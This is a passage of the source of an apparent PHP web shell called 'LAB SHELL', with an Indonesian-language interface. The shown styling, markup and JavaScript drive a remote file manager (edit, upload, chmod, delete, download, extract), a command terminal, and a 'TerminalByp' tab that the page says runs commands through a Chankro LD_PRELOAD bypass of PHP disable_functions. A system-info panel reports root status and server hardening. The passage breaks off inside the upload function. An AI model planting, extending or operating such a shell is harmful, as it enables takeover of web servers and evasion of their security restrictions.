#ed-area{-webkit-box-flex:1;-ms-flex:1;flex:1;resize:none;border:none;border-radius:0;background:var(--s1);color:var(--t1);font-size:13px;padding:14px;line-height:1.7;font-family:var(--ff)}
.eb{padding:6px 16px;border-radius:6px;font-size:12px;font-weight:600;border:1px solid var(--bd);cursor:pointer}
.eb-save{background:var(--acc);color:#fff;border-color:var(--acc)}
.eb-close{background:var(--s3);color:var(--t2)}

/* ────── MODAL ────── */
#modal{
  position:fixed;inset:0;background:rgba(0,0,0,.65);
  display:none;-webkit-box-align:center;-ms-flex-align:center;align-items:center;
  -webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;z-index:20;
}
#modal.on{display:-webkit-box;display:-ms-flexbox;display:flex}
#m-box{
  background:var(--s1);border:1px solid var(--bd);
  border-radius:12px;padding:24px;width:420px;
  -webkit-box-shadow:0 20px 50px rgba(0,0,0,.5);box-shadow:0 20px 50px rgba(0,0,0,.5);
}
#m-title{font-size:14px;font-weight:700;margin-bottom:16px;color:var(--acc2)}
#m-body{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-box-direction:normal;-ms-flex-direction:column;flex-direction:column;gap:8px}
#m-body label{font-size:11px;color:var(--t3)}
#m-body input{width:100%;font-size:13px}
.m-btns{display:-webkit-box;display:-ms-flexbox;display:flex;gap:8px;-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;margin-top:18px}
.mb{padding:7px 20px;border-radius:6px;font-size:13px;font-weight:600;border:1px solid var(--bd);cursor:pointer}
.mb-ok{background:var(--acc);color:#fff;border-color:var(--acc)}
.mb-c{background:var(--s3);color:var(--t2)}

/* ────── TERMINAL ────── */
#priv-card{
  margin:14px 14px 0;padding:14px 16px;border-radius:10px;border:1px solid;
  font-family:var(--ff);font-size:12px;-ms-flex-negative:0;flex-shrink:0;
}
#priv-card.rm{background:rgba(239,68,68,.07);border-color:rgba(239,68,68,.3)}
#priv-card.um{background:rgba(16,185,129,.07);border-color:rgba(16,185,129,.3)}
.pc-title{font-size:13px;font-weight:700;margin-bottom:6px}
.rm .pc-title{color:var(--r)} .um .pc-title{color:var(--g)}
.pc-detail{color:var(--t2);line-height:1.9}
.pc-note{
  margin-top:10px;padding:9px 13px;border-radius:7px;font-size:11px;line-height:1.75;
  background:rgba(6,182,212,.07);border:1px solid rgba(6,182,212,.25);color:var(--acc2);
}

#t-info{
  display:-webkit-box;display:-ms-flexbox;display:flex;
  -webkit-box-align:center;-ms-flex-align:center;align-items:center;
  gap:14px;padding:7px 14px;
  background:var(--s1);border-bottom:1px solid var(--bd);
  font-size:11px;font-family:var(--ff);color:var(--t3);-ms-flex-negative:0;flex-shrink:0;margin-top:10px;
  -ms-flex-wrap:wrap;flex-wrap:wrap;
}
#t-info b{color:var(--t2)}

#t-out{-webkit-box-flex:1;-ms-flex:1;flex:1;overflow-y:auto;padding:12px 16px;font-family:var(--ff);font-size:12.5px;line-height:1.75}
.te{margin-bottom:12px;-webkit-animation:fi .15s ease;animation:fi .15s ease}
@-webkit-keyframes fi{from{opacity:0;-webkit-transform:translateY(3px);transform:translateY(3px)}to{opacity:1;-webkit-transform:translateY(0);transform:translateY(0)}}
@keyframes fi{from{opacity:0;-webkit-transform:translateY(3px);transform:translateY(3px)}to{opacity:1;-webkit-transform:translateY(0);transform:translateY(0)}}
.tp{font-weight:700}
.tp.norm{color:var(--acc)} .tp.root{color:var(--r)}
.tc{color:var(--acc2)}
.to{
  white-space:pre-wrap;word-break:break-all;color:var(--t1);
  padding:4px 0 4px 14px;border-left:2px solid var(--bd);margin-top:3px;
}

#t-row{
  display:-webkit-box;display:-ms-flexbox;display:flex;
  -webkit-box-align:center;-ms-flex-align:center;align-items:center;
  gap:8px;padding:10px 14px;
  background:var(--s1);border-top:1px solid var(--bd);-ms-flex-negative:0;flex-shrink:0;
}
#t-lbl{font-family:var(--ff);font-size:13px;white-space:nowrap;font-weight:700}
#t-lbl.norm{color:var(--acc)} #t-lbl.root{color:var(--r)}
#t-in{-webkit-box-flex:1;-ms-flex:1;flex:1;background:transparent;border:none;border-radius:0;font-size:13px;padding:0;color:var(--t1)}
#t-run{
  padding:6px 20px;border:none;border-radius:6px;font-size:13px;font-weight:700;color:#fff;
  background:-webkit-linear-gradient(135deg,var(--acc),#5b21b6);background:linear-gradient(135deg,var(--acc),#5b21b6);
  -webkit-box-shadow:0 0 14px rgba(124,58,237,.3);box-shadow:0 0 14px rgba(124,58,237,.3);transition:-webkit-box-shadow .2s;transition:box-shadow .2s;
}
#t-run:hover{-webkit-box-shadow:0 0 22px rgba(124,58,237,.5);box-shadow:0 0 22px rgba(124,58,237,.5)}
#t-clr{padding:6px 12px;background:var(--s3);border:1px solid var(--bd);color:var(--t3);border-radius:6px;font-size:12px}
#t-clr:hover{color:var(--r);border-color:var(--r)}

/* ────── SYSINFO ────── */
#p-info{overflow-y:auto;padding:16px}
.si-grid{display:-ms-grid;display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
.si-card-full{grid-column:1/-1}
@media(max-width:900px){.si-grid{grid-template-columns:1fr}.si-card-full{grid-column:1}}
.si-card{background:var(--s1);border:1px solid var(--bd);border-radius:10px;overflow:hidden}
.si-head{
  display:-webkit-box;display:-ms-flexbox;display:flex;
  -webkit-box-align:center;-ms-flex-align:center;align-items:center;
  gap:8px;padding:10px 14px;
  background:var(--s2);border-bottom:1px solid var(--bd);
  font-size:12px;font-weight:700;color:var(--acc2);font-family:var(--ff);
}
.si-body{padding:12px 14px;font-family:var(--ff);font-size:11.5px;line-height:1.9}
.si-row{display:-webkit-box;display:-ms-flexbox;display:flex;gap:8px;border-bottom:1px solid rgba(37,38,56,.4);padding:4px 0}
.si-row:last-child{border-bottom:none}
.si-k{color:var(--t3);min-width:140px;-ms-flex-negative:0;flex-shrink:0;font-size:11px}
.si-v{color:var(--t1);word-break:break-all}
.si-v.ok{color:var(--g)} .si-v.warn{color:var(--y)} .si-v.danger{color:var(--r)}
.si-pre{white-space:pre-wrap;word-break:break-word;color:var(--t1);font-size:10.5px;line-height:1.65;background:var(--bg);border-radius:6px;padding:10px;margin-top:4px}
.si-loading{text-align:center;padding:30px;color:var(--t3)}
#si-refresh{
  padding:7px 18px;border-radius:7px;font-size:12px;font-weight:600;
  background:-webkit-linear-gradient(135deg,rgba(6,182,212,.15),rgba(124,58,237,.15));
  background:linear-gradient(135deg,rgba(6,182,212,.15),rgba(124,58,237,.15));
  border:1px solid rgba(6,182,212,.3);color:var(--acc2);margin-bottom:16px;transition:all .2s;
}
#si-refresh:hover{background:-webkit-linear-gradient(135deg,rgba(6,182,212,.3),rgba(124,58,237,.3));background:linear-gradient(135deg,rgba(6,182,212,.3),rgba(124,58,237,.3));border-color:var(--acc2)}

/* TOAST */
.toast{
  position:fixed;bottom:20px;right:20px;z-index:999;
  padding:10px 18px;border-radius:8px;font-family:var(--ff);font-size:12px;
  border:1px solid;-webkit-box-shadow:0 4px 20px rgba(0,0,0,.4);box-shadow:0 4px 20px rgba(0,0,0,.4);
  -webkit-animation:fi .2s ease;animation:fi .2s ease;pointer-events:none;max-width:320px;
}
.t-ok{background:#021a11;color:var(--g);border-color:rgba(16,185,129,.4)}
.t-err{background:#1a0202;color:var(--r);border-color:rgba(239,68,68,.4)}
.t-info{background:#050b14;color:var(--acc2);border-color:rgba(6,182,212,.4)}

.spin{display:inline-block;width:12px;height:12px;border:2px solid var(--bd);border-top-color:var(--acc);border-radius:50%;-webkit-animation:sp .6s linear infinite;animation:sp .6s linear infinite}
@-webkit-keyframes sp{to{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}
@keyframes sp{to{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}

/* ────── TERMINAL BYP (Chankro) ────── */
#byp-info{
  display:-webkit-box;display:-ms-flexbox;display:flex;
  -webkit-box-align:center;-ms-flex-align:center;align-items:center;
  gap:12px;padding:7px 14px;
  background:var(--s1);border-bottom:1px solid var(--bd);
  font-size:11px;font-family:var(--ff);color:var(--t3);-ms-flex-negative:0;flex-shrink:0;
  -ms-flex-wrap:wrap;flex-wrap:wrap;
}
#byp-info b{color:var(--t2)}
#byp-out{-webkit-box-flex:1;-ms-flex:1;flex:1;overflow-y:auto;padding:12px 16px;font-family:var(--ff);font-size:12.5px;line-height:1.75}
#byp-row{
  display:-webkit-box;display:-ms-flexbox;display:flex;
  -webkit-box-align:center;-ms-flex-align:center;align-items:center;
  gap:8px;padding:10px 14px;
  background:var(--s1);border-top:1px solid var(--bd);-ms-flex-negative:0;flex-shrink:0;
}
#byp-lbl{font-family:var(--ff);font-size:13px;white-space:nowrap;font-weight:700;color:var(--y)}
#byp-in{-webkit-box-flex:1;-ms-flex:1;flex:1;background:transparent;border:none;border-radius:0;font-size:13px;padding:0;color:var(--t1)}
#byp-run{
  padding:6px 20px;border:none;border-radius:6px;font-size:13px;font-weight:700;color:#fff;
  background:-webkit-linear-gradient(135deg,var(--y),var(--o));background:linear-gradient(135deg,var(--y),var(--o));
  -webkit-box-shadow:0 0 14px rgba(245,158,11,.3);box-shadow:0 0 14px rgba(245,158,11,.3);transition:-webkit-box-shadow .2s;transition:box-shadow .2s;
}
#byp-run:hover{-webkit-box-shadow:0 0 22px rgba(245,158,11,.5);box-shadow:0 0 22px rgba(245,158,11,.5)}
#byp-clr{padding:6px 12px;background:var(--s3);border:1px solid var(--bd);color:var(--t3);border-radius:6px;font-size:12px}
#byp-clr:hover{color:var(--r);border-color:var(--r)}
#byp-test-btn{
  padding:5px 13px;background:rgba(245,158,11,.1);border:1px solid rgba(245,158,11,.3);
  color:var(--y);border-radius:6px;font-size:11px;font-weight:600;transition:all .15s;
}
#byp-test-btn:hover{background:rgba(245,158,11,.22);border-color:var(--y)}
.byp-m{display:inline-flex;align-items:center;gap:3px;padding:1px 8px;border-radius:8px;font-size:9px;font-weight:700;font-family:var(--ff)}
.byp-ok{background:rgba(16,185,129,.12);color:var(--g);border:1px solid rgba(16,185,129,.3)}
.byp-fail{background:rgba(239,68,68,.12);color:var(--r);border:1px solid rgba(239,68,68,.3)}
#byp-status-bar{
  display:-webkit-box;display:-ms-flexbox;display:flex;
  -webkit-box-align:center;-ms-flex-align:center;align-items:center;
  gap:8px;padding:4px 14px;
  background:rgba(245,158,11,.05);border-bottom:1px solid rgba(245,158,11,.15);
  font-size:10px;font-family:var(--ff);color:var(--t3);-ms-flex-negative:0;flex-shrink:0;
}
</style>
</head>
<body>
<div id="app">

<!-- TOPBAR -->
<div id="topbar">
  <span class="logo">&#9889; LAB SHELL</span>
  <?php if ($isRoot): ?>
  <span class="badge b-root">&#9888; ROOT</span>
  <?php else: ?>
  <span class="badge b-user">&#128100; <?php echo htmlspecialchars($currentUser); ?></span>
  <?php endif; ?>
  <span class="chip">&#128421; <b><?php echo PHP_OS_FAMILY; ?></b></span>
  <span class="chip">&#128024; <b>PHP <?php echo PHP_VERSION; ?></b></span>
  <span class="chip">&#127760; <b><?php echo htmlspecialchars($ip); ?></b></span>
  <div class="tabs">
    <button class="tab on" id="tb-fm"   onclick="sw('fm')">&#128193; File Manager</button>
    <button class="tab"    id="tb-term" onclick="sw('term')">&#128187; Terminal</button>
    <button class="tab"    id="tb-byp"  onclick="sw('byp')">&#9889; TerminalByp</button>
    <button class="tab"    id="tb-info" onclick="sw('info')">&#128202; System Info</button>
  </div>
</div>

<!-- MAIN -->
<div id="main">

<!-- ───── FILE MANAGER ───── -->
<div id="p-fm" class="panel on">
  <div id="clip-bar">
    <span id="clip-op-badge" class="clip-op-badge clip-op-copy">COPY</span>
    <span id="clip-info">0 item di clipboard</span>
    <button class="paste-btn" onclick="doPaste()">&#128203; Paste di Sini</button>
    <button class="clip-cancel" onclick="clipClear()">&#10005; Batalkan</button>
  </div>
  <!-- Breadcrumb navigasi path -->
  <div id="fm-breadcrumb"></div>
  <div id="fm-bar">
    <button class="fbtn" onclick="up()">&#8679; Up</button>
    <input type="text" id="fm-path-in" value="<?php echo htmlspecialchars($cwd); ?>" placeholder="/path">
    <button class="fbtn" onclick="go()">&#8594; Go</button>
    <button class="fbtn" onclick="md2('dir')">&#128193;+ Folder</button>
    <button class="fbtn" onclick="md2('file')">&#128196;+ File</button>
    <button class="fbtn" onclick="rl()">&#8635; Refresh</button>
  </div>
  <div id="tbl-wrap">
    <table id="tbl">
      <thead><tr>
        <th class="cb-cell"><input type="checkbox" class="fm-cb" id="cb-all" onclick="cbAll(this)" title="Pilih semua"></th>
        <th>Nama</th><th>Tipe</th><th>Ukuran</th><th>Permission</th><th>Octal</th><th>Aksi</th>
      </tr></thead>
      <tbody id="tb"><tr><td colspan="7" style="text-align:center;padding:30px;color:var(--t3)"><span class="spin"></span> Memuat...</td></tr></tbody>
    </table>
  </div>
  <div id="bulk-bar">
    <span id="bulk-count">0 dipilih</span>
    <div class="bbtn-sep"></div>
    <button class="bbtn del" onclick="bulkDel()">&#128465; Hapus</button>
    <button class="bbtn" onclick="clipCopy()">&#128203; Copy</button>
    <button class="bbtn" onclick="clipMove()">&#9986; Pindah</button>
    <div class="bbtn-sep"></div>
    <button class="bbtn" style="margin-left:auto" onclick="cbClear()">&#10005; Batalkan</button>
  </div>
  <div id="up-bar">
    <span style="font-size:11px;color:var(--t3)">&#8679; Upload:</span>
    <input type="file" id="upl" multiple>
    <button class="fbtn" onclick="doUpl()">Upload</button>
    <span id="up-msg"></span>
  </div>
</div>

<!-- ───── TERMINAL ───── -->
<div id="p-term" class="panel" style="overflow-y:auto">
  <div id="t-info">
    <span>CMD: <b id="ti-cwd"><?php echo htmlspecialchars($termCwd); ?></b></span>
    <span>Server: <b><?php echo htmlspecialchars(isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'PHP Built-in'); ?></b></span>
    <span>PHP.ini: <b><?php echo htmlspecialchars(php_ini_loaded_file() ?: 'N/A'); ?></b></span>
    <span>Mem: <b><?php echo ini_get('memory_limit'); ?></b></span>
    <span>disable_fn: <b style="color:var(--<?php echo ini_get('disable_functions') ? 'r' : 'g'; ?>)"><?php echo ini_get('disable_functions') ? 'Ada' : 'Tidak ada'; ?></b></span>
  </div>
<div id="t-out"></div>
  <div id="t-row">
    <span id="t-lbl" class="norm"><?php echo htmlspecialchars($currentUser); ?>@<?php echo htmlspecialchars(isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost'); ?> $</span>
    <input type="text" id="t-in" placeholder="ketik command..." autofocus onkeydown="tk(event)">
    <button id="t-run" onclick="sc()">&#9654; Run</button>
    <button id="t-clr" onclick="ct()">Clear</button>
  </div>
</div>

<!-- ───── TERMINAL BYP (Chankro LD_PRELOAD) ───── -->
<div id="p-byp" class="panel" style="overflow-y:auto">
  <div id="byp-status-bar">
    <span style="color:var(--y);font-weight:700">&#9889; CHANKRO BYPASS</span>
    <span>&#x25cf; ELF hook hardcoded &#8212; <b style="color:var(--g)">standalone, tanpa file eksternal</b></span>
    <span>&#x25cf; Trigger: mail / mb_send_mail / error_log / imap_mail</span>
    <span>&#x25cf; PHP 5.3 – PHP 8.x+ compatible</span>
    <span style="margin-left:auto">
      <button id="byp-test-btn" onclick="testByp()">&#128269; Test Bypass</button>
    </span>
  </div>
  <div id="byp-info">
    <span>Dir: <b id="byp-dir"><?php echo htmlspecialchars($termCwd); ?></b></span>
    <span>PHP: <b><?php echo PHP_VERSION; ?></b></span>
    <span>OS: <b><?php echo htmlspecialchars(strtoupper(substr(PHP_OS,0,3))==='WIN'?'Windows':PHP_OS); ?></b></span>
    <span>disable_fn: <b style="color:var(--<?php echo ini_get('disable_functions')?'r':'g';?>)"><?php echo ini_get('disable_functions')?'Ada':'Tidak ada'; ?></b></span>
  </div>
  <div id="byp-out"></div>
  <div id="byp-row">
    <span id="byp-lbl">byp@<?php echo htmlspecialchars(isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost'); ?> $</span>
    <input type="text" id="byp-in" placeholder="ketik command (bypass via LD_PRELOAD)..." onkeydown="tkByp(event)">
    <button id="byp-run" onclick="scByp()">&#9889; Run</button>
    <button id="byp-clr" onclick="ctByp()">Clear</button>
  </div>
</div>

<!-- ───── SYSTEM INFO ───── -->
<div id="p-info" class="panel">
  <div style="display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;gap:12px;margin-bottom:4px;-ms-flex-negative:0;flex-shrink:0">
    <button id="si-refresh" onclick="loadSysInfo()">&#128260; Refresh Info</button>
    <span style="font-size:11px;color:var(--t3);font-family:var(--ff)" id="si-ts"></span>
  </div>
  <div class="si-grid" id="si-grid">
    <div class="si-loading"><span class="spin"></span> Memuat informasi sistem...</div>
  </div>
</div>

<!-- Editor -->
<div id="ed-wrap">
  <div id="ed-box">
    <div id="ed-head">
      <span id="ed-fn">&#8212;</span>
      <button class="eb eb-save" onclick="sf()">&#128190; Save</button>
      <button class="eb eb-close" onclick="ce()">&#10005; Close</button>
    </div>
    <textarea id="ed-area" spellcheck="false"></textarea>
  </div>
</div>

<!-- Modal -->
<div id="modal">
  <div id="m-box">
    <div id="m-title"></div>
    <div id="m-body"></div>
    <div class="m-btns">
      <button class="mb mb-c" onclick="cm()">Batal</button>
      <button class="mb mb-ok" id="m-ok">OK</button>
    </div>
  </div>
</div>

</div><!-- /main -->
</div><!-- /app -->

<script>
var D   = <?php echo json_encode($cwd); ?>;
var BASE_DIR = <?php echo json_encode(dirname($_SERVER['SCRIPT_FILENAME'])); ?>;
var TCWD = <?php echo json_encode($termCwd); ?>;
var ep  = null;
var H   = [];
var hi  = -1;
var upMsgTimer = null;
var IS_ROOT = <?php echo json_encode($isRoot); ?>;
var CU  = <?php echo json_encode($currentUser); ?>;
var CH  = <?php echo json_encode(isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost'); ?>;
var SELF = location.href.split('?')[0];

/* TAB */
function sw(t){
  var tabs = ['fm','term','byp','info'];
  for(var i=0;i<tabs.length;i++){
    document.getElementById('p-'+tabs[i]).classList.toggle('on', tabs[i]===t);
    document.getElementById('tb-'+tabs[i]).classList.toggle('on', tabs[i]===t);
  }
  if(t==='fm') ld(D);
  else if(t==='term') document.getElementById('t-in').focus();
  else if(t==='byp') document.getElementById('byp-in').focus();
  else if(t==='info') loadSysInfo();
}

/* API */
function api(d){
  var fd = new FormData();
  var keys = Object.keys(d);
  for(var i=0;i<keys.length;i++) fd.append(keys[i], d[keys[i]]);
  return fetch(SELF,{method:'POST',body:fd}).then(function(r){return r.json();}).catch(function(e){return{ok:false,msg:''+e};});
}

/* BREADCRUMB */
function buildBreadcrumb(path){
  var bc = document.getElementById('fm-breadcrumb');
  if(!bc) return;
  
  var parts = path.replace(/\\/g,'/').split('/').filter(function(p,i){ return p!=='' || i===0; });
  
  // 1. Tombol HOME Khusus (Selalu kembali ke folder tempat tes9.php berada)
  var html = '<span class="bc-seg bc-root" style="margin-right:8px; background:rgba(124,58,237,0.15); color:var(--acc);" onclick="ld(BASE_DIR)" title="Kembali ke lokasi awal">&#127968; Home</span>';
  
  var accumulated = '';
  for(var i=0;i<parts.length;i++){
    var seg = parts[i];
    
    if(i===0 && seg===''){
      // Unix root path (/)
      accumulated = '/';
      html += '<span class="bc-seg" onclick="ld(\'/\')">/</span>';
    } else {
      accumulated = accumulated === '/' ? '/'+seg : accumulated+'/'+seg;
      var acc2 = accumulated;
      // Jangan tambahkan separator sebelum elemen pertama jika di Windows
      html += (i > 0 ? '<span class="bc-sep">/</span>' : '')
        +'<span class="bc-seg" onclick="ld(\''+j(acc2)+'\')">'+ x(seg)+'</span>';
    }
  }
  bc.innerHTML = html;
}

/* FILE MANAGER */
function ld(dir){
  D = dir;
  document.getElementById('fm-path-in').value = dir;
  var tb = document.getElementById('tb');
  tb.innerHTML = '<tr><td colspan="7" style="text-align:center;padding:30px;color:var(--t3)"><span class="spin"></span> Memuat...</td></tr>';
  api({action:'ls',dir:dir}).then(function(r){
    if(!r.ok){tb.innerHTML='<tr><td colspan="7" style="color:var(--r);padding:20px">&#10060; '+x(r.msg)+'</td></tr>';return;}
    D = r.cwd; document.getElementById('fm-path-in').value = r.cwd;
    buildBreadcrumb(r.cwd);
    cbClear();
    if(!r.entries.length){tb.innerHTML='<tr><td colspan="7" style="color:var(--t3);padding:20px">Direktori kosong.</td></tr>';return;}
    var html = '';
    for(var i=0;i<r.entries.length;i++){
      var e = r.entries[i];
      var pc = e.writable ? 'pok' : 'pro';
      var cl = 'lbl l-'+(e.label||'UNKNOWN');
      var ck = e.type==='dir' ? "ld('"+j(e.path)+"')" : "oe('"+j(e.path)+"')";
      var isUp = e.name==='..';
      var cbHtml = isUp ? '<td class="cb-cell"></td>' : '<td class="cb-cell"><input type="checkbox" class="fm-cb" data-path="'+x(e.path)+'" onchange="cbChange()"></td>';
      var fname = e.name.toLowerCase();
      var isZip = e.type==='file' && fname.endsWith('.zip');
      var isTar = e.type==='file' && (fname.endsWith('.tar')||fname.endsWith('.tar.gz')||fname.endsWith('.tgz')||fname.endsWith('.tar.bz2')||fname.endsWith('.tbz2')||fname.endsWith('.tar.xz')||fname.endsWith('.gz')||fname.endsWith('.bz2')||fname.endsWith('.xz'));
      var extBtn = isZip ? '<button class="rb ext" onclick="extractFile(\'unzip\',\''+j(e.path)+'\')" title="Ekstrak .zip">&#128230; Unzip</button>'
                 : isTar ? '<button class="rb ext" onclick="extractFile(\'untargz\',\''+j(e.path)+'\')" title="Ekstrak tar">&#128230; UnTar</button>'
                 : '';
      var dlBtn = e.type==='file' ? '<button class="rb dl" onclick="dlFile(\''+j(e.path)+'\')" title="Download file">&#11015; DL</button>' : '';
      var ac = isUp ? '' :
        '<div class="acts">'
        +(e.type==='file' ? '<button class="rb" onclick="oe(\''+j(e.path)+'\')">Edit</button>' : '')
        +extBtn
        +'<button class="rb" onclick="showRn(\''+j(e.path)+'\',\''+j(e.name)+'\')">Rename</button>'
        +'<button class="rb" onclick="showCh(\''+j(e.path)+'\',\''+j(e.octal)+'\')">Chmod</button>'
        +dlBtn
        +'<button class="rb del" onclick="delF(\''+j(e.path)+'\',\''+j(e.name)+'\')">Del</button>'
        +'</div>';
      html += '<tr>'
        + cbHtml
        + '<td><div class="fn" onclick="'+ck+'"><span class="'+cl+'">'+x(e.label)+'</span><span class="fn-t">'+x(e.name)+'</span></div></td>'
        + '<td style="color:var(--t3);font-size:10px">'+e.type.toUpperCase()+'</td>'
        + '<td style="color:var(--t3);font-size:10px">'+x(e.size)+'</td>'
        + '<td class="'+pc+'" style="font-size:10px;font-family:var(--ff)">'+x(e.perm)+'</td>'
        + '<td style="color:var(--o);font-size:10px;font-family:var(--ff)">'+x(e.octal)+'</td>'
        + '<td>'+ac+'</td></tr>';
    }
    tb.innerHTML = html;
  });
}
function up(){var p=D.replace(/[\/\\][^\/\\]+$/,'')||'/';ld(p||D);}
function go(){ld(document.getElementById('fm-path-in').value.trim());}
function rl(){ld(D);}

/* DOWNLOAD */
function dlFile(path){
  var url = SELF + '?dl=' + encodeURIComponent(path);
  var a = document.createElement('a');
  a.href = url;
  a.download = path.split(/[\/\\]/).pop();
  document.body.appendChild(a);
  a.click();
  setTimeout(function(){document.body.removeChild(a);}, 100);
  toast('&#11015; Mengunduh '+path.split(/[\/\\]/).pop(),'info');
}

/* EDITOR */
function oe(p){
  api({action:'read',path:p}).then(function(r){
    if(!r.ok){toast(r.msg,'err');return;}
    ep = r.path;
    document.getElementById('ed-fn').textContent = r.path;
    document.getElementById('ed-area').value = r.content;
    document.getElementById('ed-wrap').classList.add('on');
    var ta = document.getElementById('ed-area');
    ta.focus();
    ta.setSelectionRange(0,0);
    ta.scrollTop = 0;
  });
}
function sf(){
  if(!ep) return;
  api({action:'save',path:ep,content:document.getElementById('ed-area').value}).then(function(r){
    toast(r.msg, r.ok?'ok':'err');
    if(r.ok) setTimeout(ce, 500);
  });
}
function ce(){document.getElementById('ed-wrap').classList.remove('on');ep=null;}

/* MODAL */
function md2(type,path,extra){
  var mt = document.getElementById('m-title');
  var mb = document.getElementById('m-body');
  var mo = document.getElementById('m-ok');
  if(type==='dir'){
    mt.innerHTML = '&#128193; Buat Folder Baru';
    mb.innerHTML = '<label>Nama Folder</label><input id="mi" type="text" placeholder="folder_baru">';
    mo.onclick = function(){
      var n = document.getElementById('mi').value.trim();
      if(!n) return;
      api({action:'create',path:D+'/'+n,type:'dir'}).then(function(r){toast(r.msg,r.ok?'ok':'err');cm();rl();});
    };
  } else if(type==='file'){
    mt.innerHTML = '&#128196; Buat File Baru';
    mb.innerHTML = '<label>Nama File</label><input id="mi" type="text" placeholder="file.php">';
    mo.onclick = function(){
      var n = document.getElementById('mi').value.trim();
      if(!n) return;
      api({action:'create',path:D+'/'+n,type:'file'}).then(function(r){toast(r.msg,r.ok?'ok':'err');cm();rl();});
    };
  } else if(type==='rename'){
    mt.innerHTML = '&#9999; Rename';
    mb.innerHTML = '<label>Nama Baru</label><input id="mi" type="text" value="'+x(extra)+'">';
    mo.onclick = function(){
      var n = document.getElementById('mi').value.trim();
      if(!n) return;
      api({action:'rename',old:path,'new':n}).then(function(r){toast(r.msg,r.ok?'ok':'err');cm();rl();});
    };
  } else if(type==='chmod'){
    mt.innerHTML = '&#128274; Change Permission';
    mb.innerHTML = '<label>Octal Permission</label><input id="mi" type="text" value="'+x(extra)+'">';
    mo.onclick = function(){
      var p2 = document.getElementById('mi').value.trim();
      if(!p2) return;
      api({action:'chmod',path:path,perm:p2}).then(function(r){toast(r.msg,r.ok?'ok':'err');cm();rl();});
    };
  }
  document.getElementById('modal').classList.add('on');
  setTimeout(function(){var mi=document.getElementById('mi');if(mi)mi.focus();}, 80);
}
function showRn(p,n){md2('rename',p,n);}
function showCh(p,o){md2('chmod',p,o);}
function delF(p,n){
  if(!confirm('Hapus "'+n+'"?')) return;
  api({action:'delete',path:p}).then(function(r){toast(r.msg,r.ok?'ok':'err');rl();});
}
function cm(){document.getElementById('modal').classList.remove('on');}

/* CHECKBOX & BULK */
function getChecked(){
  var boxes = document.querySelectorAll('.fm-cb:checked');
  var paths = [];
  for(var i=0;i<boxes.length;i++) paths.push(boxes[i].dataset.path);
  return paths;
}
function cbAll(el){
  var boxes = document.querySelectorAll('.fm-cb');
  for(var i=0;i<boxes.length;i++){
    boxes[i].checked = el.checked;
    boxes[i].closest('tr').classList.toggle('sel-row', el.checked);
  }
  cbChange();
}
function cbChange(){
  var checked = document.querySelectorAll('.fm-cb:checked');
  var all = document.querySelectorAll('.fm-cb');
  var ca = document.getElementById('cb-all');
  ca.indeterminate = checked.length>0 && checked.length<all.length;
  ca.checked = checked.length>0 && checked.length===all.length;
  var boxes2 = document.querySelectorAll('.fm-cb');
  for(var i=0;i<boxes2.length;i++) boxes2[i].closest('tr').classList.toggle('sel-row', boxes2[i].checked);
  var n = checked.length;
  document.getElementById('bulk-count').textContent = n + ' item dipilih';
  document.getElementById('bulk-bar').classList.toggle('on', n>0);
}
function cbClear(){
  var boxes = document.querySelectorAll('.fm-cb');
  for(var i=0;i<boxes.length;i++){
    boxes[i].checked=false;
    if(boxes[i].closest) boxes[i].closest('tr').classList.remove('sel-row');
  }
  var ca = document.getElementById('cb-all');
  if(ca){ca.checked=false;ca.indeterminate=false;}
  document.getElementById('bulk-bar').classList.remove('on');
}
function bulkDel(){
  var paths = getChecked();
  if(!paths.length){toast('Tidak ada item dipilih','err');return;}
  if(!confirm('Hapus '+paths.length+' item yang dipilih?')) return;
  api({action:'bulk_delete',paths:JSON.stringify(paths)}).then(function(r){toast(r.msg,r.ok?'ok':'err');cbClear();rl();});
}

/* CLIPBOARD */
var _clip = null;
function clipCopy(){
  var paths = getChecked();
  if(!paths.length){toast('Pilih file/folder dulu','err');return;}
  _clip = {op:'copy', paths:paths};
  updateClipBar(); cbClear();
  toast('&#128203; '+paths.length+' item siap di-copy. Navigasi ke folder tujuan, lalu klik Paste.','info');
}
function clipMove(){
  var paths = getChecked();
  if(!paths.length){toast('Pilih file/folder dulu','err');return;}
  _clip = {op:'move', paths:paths};
  updateClipBar(); cbClear();
  toast('&#9986; '+paths.length+' item siap dipindah. Navigasi ke folder tujuan, lalu klik Paste.','info');
}
function clipClear(){_clip=null;updateClipBar();}
function updateClipBar(){
  var bar = document.getElementById('clip-bar');
  if(!_clip){bar.classList.remove('on');return;}
  bar.classList.add('on');
  var badge = document.getElementById('clip-op-badge');
  badge.textContent = _clip.op==='copy' ? 'COPY' : 'MOVE';
  badge.className = 'clip-op-badge '+(_clip.op==='copy'?'clip-op-copy':'clip-op-move');
  document.getElementById('clip-info').textContent = _clip.paths.length+' item — navigasi ke folder tujuan, lalu klik Paste';
}
function doPaste(){
  if(!_clip){toast('Clipboard kosong','err');return;}
  var op = _clip.op; var paths = _clip.paths; var dest = D;
  var action = op==='copy' ? 'bulk_copy' : 'bulk_move';
  api({action:action,paths:JSON.stringify(paths),dest:dest}).then(function(r){
    toast(r.msg,r.ok?'ok':'err');
    if(r.ok){_clip=null;updateClipBar();rl();}
  });
}

/* EXTRACT */
function extractFile(type,path){
  toast('&#9203; Mengekstrak '+path.split(/[\/\\]/).pop()+'...','info');
  api({action:type,path:path}).then(function(r){
    toast(r.msg,r.ok?'ok':'err');
    if(r.ok) rl();
  });
}

/* UPLOAD */
function doUpl(){
  var input = document.getElementById('upl');
  var fs = input.files;
  if(!fs.length){toast('Pilih file dulu','err');return;}
  var um = document.getElementById('up-msg');
  if(upMsgTimer) clearTimeout(upMsgTimer);
  um.style.opacity='1'; um.textContent=''; um.className='';

  var idx = 0;
function uploadNext(){
    if(idx >= fs.length){
      upMsgTimer = setTimeout(function(){
        um.style.opacity='0';
